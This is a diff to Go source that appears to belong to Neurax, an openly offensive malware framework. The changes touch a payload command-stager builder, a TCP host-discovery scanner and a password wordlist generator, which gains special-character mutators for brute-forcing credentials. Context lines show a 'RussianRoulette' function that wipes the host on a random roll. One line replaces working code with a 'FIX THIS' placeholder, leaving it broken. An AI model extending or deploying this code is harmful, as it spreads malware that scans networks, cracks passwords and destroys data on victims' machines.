@@ -265,6 +265,7 @@ func NeuraxStager() string {
 	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "SUDO", sudo, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "RETRY", stager_retry, -1)
+	NeuraxDebug("Created command stager: " + selected_stager_command)
 	return selected_stager_command
 }
 
@@ -292,7 +293,7 @@ func IsHostActive(target string) bool {
 		for _, port := range N.ScanShakerPorts {
 			timeout := time.Duration(N.ScanActiveTimeout) * time.Second
 			port_str := strconv.Itoa(port)
-			err, _ := net.DialTimeout("tcp", target+port_str, timeout)
+			_, err := net.DialTimeout("tcp", target+port_str, timeout)
 			if err == nil {
 				NeuraxDebug("Found active host: " + target)
 				return true
@@ -300,7 +301,7 @@ func IsHostActive(target string) bool {
 		}
 	} else {
 		first := 19
-		last := 300
+		last := 200
 		if N.ScanFullRange {
 			last = 65535
 		}
@@ -770,6 +771,26 @@ func WordCharSwap(word string) []string {
 	return []string{string(w)}
 }
 
+func WordSpecialCharsAppend(word string) []string {
+	res := []string{}
+	res = append(res, word+"!")
+	res = append(res, word+"!@")
+	res = append(res, word+"!@#")
+	res = append(res, word+"!@#$")
+	res = append(res, word+"!@#$%")
+	return res
+}
+
+func WordSpecialCharsPrepend(word string) []string {
+	res := []string{}
+	res = append(res, "!"+word)
+	res = append(res, "!@"+word)
+	res = append(res, "!@#"+word)
+	res = append(res, "!@#$"+word)
+	res = append(res, "!@#$%"+word)
+	return res
+}
+
 func RussianRoulette() error {
 	if RandomInt(1, 6) == 6 {
 		return Wipe()
@@ -791,7 +812,7 @@ func NeuraxWordlist(words ...string) []string {
 	}
 	for _, word := range words {
 		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
-		last_to_upper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)]))
+		last_to_upper := "FIX THIS" //word[:len(word)-1] + strings.ToUpper(string(word[len(word)]))
 		wordlist = append(wordlist, strings.ToUpper(word))
 		wordlist = append(wordlist, first_to_upper)
 		wordlist = append(wordlist, last_to_upper)
@@ -825,6 +846,12 @@ func NeuraxWordlist(words ...string) []string {
 			}
 			if Contains(N.WordlistMutators, "char_swap") || use_all {
 				wordlist = append(wordlist, WordCharSwap(word)...)
+			}
+			if Contains(N.WordlistMutators, "special_append") || use_all {
+				wordlist = append(wordlist, WordSpecialCharsAppend(word)...)
+			}
+			if Contains(N.WordlistMutators, "special_prepend") || use_all {
+				wordlist = append(wordlist, WordSpecialCharsPrepend(word)...)
 			}
 		}
 	}
